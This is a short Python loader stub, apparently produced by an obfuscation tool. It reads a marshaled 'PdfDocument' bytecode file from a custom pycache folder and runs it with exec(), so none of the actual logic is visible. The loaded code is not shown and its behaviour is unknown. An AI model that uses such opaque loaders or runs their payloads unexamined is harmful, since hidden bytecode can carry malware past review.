
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'PdfDocument_4d5cb61b703d46c58ddce54aaf88c950.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
